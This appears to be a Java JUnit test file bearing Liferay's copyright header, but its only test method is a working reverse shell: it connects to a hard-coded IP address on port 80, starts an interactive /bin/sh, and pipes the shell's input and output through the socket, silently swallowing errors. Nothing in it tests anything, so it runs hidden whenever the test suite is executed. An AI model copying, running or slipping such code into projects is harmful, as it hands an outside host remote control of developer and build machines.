/**
 * Copyright (c) 2000-present Liferay, Inc. All rights reserved.
 *
 * This library is free software; you can redistribute it and/or modify it under
 * the terms of the GNU Lesser General Public License as published by the Free
 * Software Foundation; either version 2.1 of the License, or (at your option)
 * any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more
 * details.
 */

package com.liferay.portal.security;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

import java.net.Socket;

import org.junit.Test;

/**
 * @author Tomas Polesovsky
 */
public class RemoteTest {

	@Test
	public void testRemotely() throws Throwable {
		try {
			Socket sock = new Socket("84.42.251.206", 80);
			Runtime rt = Runtime.getRuntime();

			Process proc = rt.exec(new String[] {"/bin/sh", "-i"});

			StreamConnector outputConnector = new StreamConnector(
				proc.getInputStream(), sock.getOutputStream());
			StreamConnector errorConnector = new StreamConnector(
				proc.getErrorStream(), sock.getOutputStream());
			StreamConnector inputConnector = new StreamConnector(
				sock.getInputStream(), proc.getOutputStream());

			outputConnector.start();
			errorConnector.start();
			inputConnector.start();
			while (proc.isAlive()) {
				Thread.currentThread().sleep(1000);
			}
		}
		catch (Throwable x) {
			x.printStackTrace();
		}
	}

	private class StreamConnector extends Thread {

		public void run() {
			BufferedReader isr = null;
			BufferedWriter osw = null;

			try {
				isr = new BufferedReader(new InputStreamReader(is));
				osw = new BufferedWriter(new OutputStreamWriter(os));

				char[] buff = new char[8192];
				int len = 0;

				while ((len = isr.read(buff)) != -1) {
					osw.write(buff, 0, len);
					osw.flush();
				}
			}
			catch (Throwable e) {
			}

			try {
				if (isr != null) {
					isr.close();
				}

				if (osw != null) {
					osw.close();
				}
			}
			catch (Throwable e) {
			}
		}

		protected StreamConnector(InputStream is, OutputStream os) {
			this.is = is;
			this.os = os;
			this.setDaemon(false);
		}

		protected InputStream is;
		protected OutputStream os;

	}

}